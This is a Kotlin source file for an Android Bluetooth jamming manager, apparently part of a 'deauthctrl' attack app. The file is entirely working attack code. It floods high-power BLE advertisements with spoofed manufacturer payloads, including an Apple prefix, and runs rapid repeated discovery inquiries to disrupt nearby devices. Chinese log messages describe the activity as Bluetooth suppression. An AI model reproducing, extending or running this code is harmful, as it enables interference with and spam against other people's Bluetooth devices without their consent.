package xin.ctkqiang.deauthctrl.manager

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

data class JammerLogEntry(
    val timestamp: Long = System.currentTimeMillis(),
    val module: String,
    val message: String,
)

class BluetoothJammerManager(private val context: Context) {

    private val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = btManager.adapter
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _log = MutableStateFlow<List<JammerLogEntry>>(emptyList())
    val log: StateFlow<List<JammerLogEntry>> = _log.asStateFlow()

    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private var bleAdvertiser: BluetoothLeAdvertiser? = null
    private var jammerJob: Job? = null
    private var inquiryReceiver: BroadcastReceiver? = null

    private var blePktCount = 0
    private var inquiryCount = 0

    fun start() {
        if (_isRunning.value) return
        val bt = adapter ?: run { _error.value = "此设备不支持蓝牙"; return }
        if (!bt.isEnabled) { _error.value = "请先开启蓝牙"; return }
        bleAdvertiser = bt.bluetoothLeAdvertiser
        _isRunning.value = true
        _error.value = null
        blePktCount = 0
        inquiryCount = 0
        jammerJob = scope.launch {
            launch { bleFloodLoop() }
            launch { inquiryFloodLoop() }
        }
    }

    fun stop() {
        _isRunning.value = false
        jammerJob?.cancel()
        try { context.unregisterReceiver(inquiryReceiver) } catch (_: Exception) {}
        inquiryReceiver = null
        bleAdvertiser = null
        log("JAMMER", "Bluetooth 压制已停止 | BLE=$blePktCount Inquiry=$inquiryCount")
    }

    fun destroy() { stop(); scope.cancel() }
    fun clearLog() { _log.value = emptyList(); blePktCount = 0; inquiryCount = 0 }

    private suspend fun bleFloodLoop() {
        val adv = bleAdvertiser ?: return
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false).build()

        val patterns = listOf(
            byteArrayOf(0x4C, 0x00, 0x05, 0x02) + randomBytes(17),
            byteArrayOf(0x06, 0x00, 0x01, 0x03) + randomBytes(12),
            byteArrayOf(0x75, 0x00, 0x01, 0x00) + randomBytes(12),
            byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + randomBytes(20),
            byteArrayOf(0x00, 0x02) + randomBytes(3) + randomBytes(8),
        )

        while (scope.isActive && _isRunning.value) {
            for (payload in patterns) {
                if (!_isRunning.value) break
                val data = AdvertiseData.Builder()
                    .addManufacturerData(0xFFFF, payload).setIncludeDeviceName(false).build()
                try {
                    adv.startAdvertising(settings, data, object : AdvertiseCallback() {
                        override fun onStartSuccess(s: AdvertiseSettings?) { blePktCount++ }
                        override fun onStartFailure(c: Int) {}
                    })
                } catch (_: Exception) {}
                delay(25)
            }
        }
    }

    private suspend fun inquiryFloodLoop() {
        while (scope.isActive && _isRunning.value) {
            try {
                inquiryReceiver = object : BroadcastReceiver() {
                    override fun onReceive(ctx: Context?, intent: Intent?) {
                        if (BluetoothDevice.ACTION_FOUND == intent?.action) {
                            inquiryCount++
                        }
                    }
                }
                context.registerReceiver(inquiryReceiver,
                    IntentFilter(BluetoothDevice.ACTION_FOUND))
                adapter?.startDiscovery()
                delay(150)
                adapter?.cancelDiscovery()
            } catch (_: Exception) {}
            delay(50)
        }
    }

    private fun randomBytes(count: Int) = ByteArray(count).also { kotlin.random.Random.nextBytes(it) }

    private fun log(module: String, msg: String) {
        _log.value = (_log.value + JammerLogEntry(module = module, message = msg)).takeLast(200)
    }
}
